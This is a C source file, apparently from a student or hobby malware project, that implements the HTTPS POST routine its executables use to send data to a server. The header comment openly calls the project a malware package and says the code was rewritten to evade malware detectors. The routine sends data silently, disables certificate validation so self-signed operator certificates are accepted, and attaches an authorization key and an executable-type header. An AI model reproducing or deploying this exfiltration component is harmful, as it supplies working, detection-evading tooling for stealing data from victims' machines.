/*
    This file handles all of the potential POST requests that will be sent out by our executables.

    While I originally wrote a version of this using libcurl, I ultimately scratched that and decided to use WiniINet since it's not
    "good" for a malware package to be EXTREMELY LARGE (which we had to have because static file).

    It's getting blocked by malware detectors. Hence, we have this
*/

#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>
#include <errno.h>
#include "winerror.h"

// typedef const wchar_t* LPCWSTR;
// Issue is we can't define wchar_t size because it's platform dependent

// gcc .\post.c -o post.exe -lwininet

void free_url_components(URL_COMPONENTS* url_components)
{
    free(url_components->lpszScheme);
    free(url_components->lpszHostName);
    free(url_components->lpszUrlPath);
    free(url_components->lpszExtraInfo);
}

int parse_url(char* address, URL_COMPONENTS* url_components)
{
    // Zero out the struct
    memset(url_components, 0, sizeof(*url_components));

    // Something they don't tell you in documentation - you're supposed to prepare a ton of stuff in url_components
    // That's because it turns out InternetCrackURL is annoying and merely REPLACES the fields
    // Unfortunately, we do have to malloc all of this
    wchar_t dummy;
    int wchar_t_size = sizeof(dummy);

    int LPZ_SCHEME_LEN = 8;
    int HOSTNAME_LEN = INTERNET_MAX_HOST_NAME_LENGTH;
    int URL_PATH_LEN = 256;
    int EXTRA_INFO_LEN = 64;

    // printf("Max hostname length: %d\n", HOSTNAME_LEN);

    url_components->lpszScheme = malloc(LPZ_SCHEME_LEN * wchar_t_size);
    url_components->dwSchemeLength = LPZ_SCHEME_LEN;
    url_components->lpszHostName = malloc(HOSTNAME_LEN * wchar_t_size);
    url_components->dwHostNameLength = HOSTNAME_LEN;
    url_components->lpszUrlPath = malloc(URL_PATH_LEN * wchar_t_size);
    url_components->dwUrlPathLength = URL_PATH_LEN;
    url_components->lpszExtraInfo = malloc(EXTRA_INFO_LEN * wchar_t_size);
    url_components->dwExtraInfoLength = EXTRA_INFO_LEN;
    url_components->dwStructSize = sizeof(*url_components);
    // url_components->dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;

    // I don't think URLs have Unicode. Hence, we're setting this to 0
    // This returns false if failed
    if (!InternetCrackUrl(address, 0, ICU_ESCAPE, url_components)) 
    {
        print_last_error("Parsing URL failed");
        free_url_components(url_components);
        return -1;
    }
}

int send_post_request(char* address, char* text, int text_size, char* exe_type, char* auth_key)
{
    // Before we do anything, parse the URL.
    URL_COMPONENTS url_components;
    parse_url(address, &url_components);
    // puts(url_components.lpszHostName);
    
    // Allow windows to access the internet. Use the 'W' version for unicode
    HINTERNET internet_connection = InternetOpen(
        "", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    );

    // Error handle for no internet
    if (internet_connection == NULL)
    {
        perror("POST: Error connecting to internet");
        free_url_components(&url_components);
        return -1;
    }

    // Create a windows HTTPS session
    HINTERNET https_session = InternetConnect(
        internet_connection,
        url_components.lpszHostName,
        INTERNET_DEFAULT_HTTPS_PORT, // This is just 443, but I don't want to mess with a typedef so here we go
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    // Error handle for the TCP handshake (or anything built on that) failing
    if (https_session == NULL)
    {
        print_last_error("POST: Error when connecting to server's HTTPS port");
        free_url_components(&url_components);
        return -1;
    }

    // Craft a request to that port's services. In this case, it's a POST request
    HINTERNET https_request = HttpOpenRequest(
        https_session,
        "POST",
        url_components.lpszUrlPath,
        NULL,
        NULL,
        NULL,                       // This is a POST request; we're not accepting types
        INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0
    );

    // Error handling for malformed request crafting
    if (https_request == NULL)
    {
        print_last_error("POST: Error when crafting HTTPS Request");
        free_url_components(&url_components);
        return -1;
    }

    // Add security flag to ignore unknown Certificate Authorities (we need this because our certs may or may not be self-signed)
    // We need to do this seperately since apparently HttpOpenRequest does not support security flags for some weird reason even though it's all bitwise-or'd
    DWORD lp_buffer;
    DWORD dw_buffer_len;

    BOOL query_internet_opts = InternetQueryOption(https_request, INTERNET_OPTION_SECURITY_FLAGS, &lp_buffer, &dw_buffer_len);
    if (query_internet_opts)
    {
        // If we successfully queried the internet, try to set the CA flag
        lp_buffer = lp_buffer | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        BOOL set_internet_opts = InternetSetOption(https_request, INTERNET_OPTION_SECURITY_FLAGS, &lp_buffer, sizeof(lp_buffer));

        // Error handling for not being able to set internet security flags
        if (!set_internet_opts)
        {
            print_last_error("POST: Error when setting security flags");
            free_url_components(&url_components);
            return -1;
        }
    }
    else
    {
        // Error during query_internet_opts
        print_last_error("POST: Error when quering security flags");
        free_url_components(&url_components);
        return -1;
    }

    // Future idea: Write a dynamic version of sprintf()
    // Form a header string
    char* oop = "Content-Type: text/plain\r\nAuthorization: ";
    char* oop2 = "\r\nexe: ";
    char* header = malloc(strlen(oop) + strlen(auth_key) + strlen(oop2) + strlen(exe_type) + 1);
    strcpy(header, oop);
    strcat(header, auth_key);
    strcat(header, oop2);
    strcat(header, exe_type);

    // Ship the POST request
    BOOL request_status = HttpSendRequest(
        https_request,
        header,
        -1,         // Automatically calculate the length of the null terminated header string
        text,
        text_size
    );

    // Error check POST request
    if (request_status == FALSE)
    {
        printf("%d\n", GetLastError());
        fflush(stdout);
        print_last_error("POST: Error when sending HTTPS Request");
        free(header);
        free_url_components(&url_components);
        return -1;
    }

    // Free that malloc
    free(header);

    // Free the URL components
    free_url_components(&url_components);

    return 0;
}

// int main()
// {
//     puts("hi");
//     send_post_request("http://localhost", "Hello World!", 12, "test", "yM^v;NAD&K`yiIED{k~@YkDv1V?4WbnqGX=U}5|rCc[SktE_?K:3bcgCX@5]QB48bBjhGM>x^Sf5Y[A0@PGH95JkWb6&c9N82m<GqULL=:kD`4D|}799Cy}50{Ox6oMPdm85jrfk2TAADH>o0O3UPDa@N548f|u&3oH=_k=CBeFVsxj[AMhP>piyuRWMRv}MnUj?WsVGIIJZhQapgRNR|7ucwFvA;O;[:``H<=qUaY_{zpUlBT8[Zo}YwdagqAU[_<82&H{@[_t<^h]KCaB{XZs`saRwOfN;>VP7GRtY:rPCUihQ]u|F?gzsO;@XO0JGU|RLf3H;UYQsNY;Qhn44lfTbQv9nhMd5G4V39t|@@nxgR`6d]NS_[JFwOr8A]avY6]SHhS}uLAW5UX}e9UW&v~ogEC4JPQny_y71:JhXuxgflnW<wFfuB_=HjwriF9fxrB5&eRgaxt}GpFbS5Gt^mSgqWeA?4umq3kIaoFS2=CWsYuriJmw&rcwPOO5vMFFJ");
//     puts("Done!");
//     return 0;
// }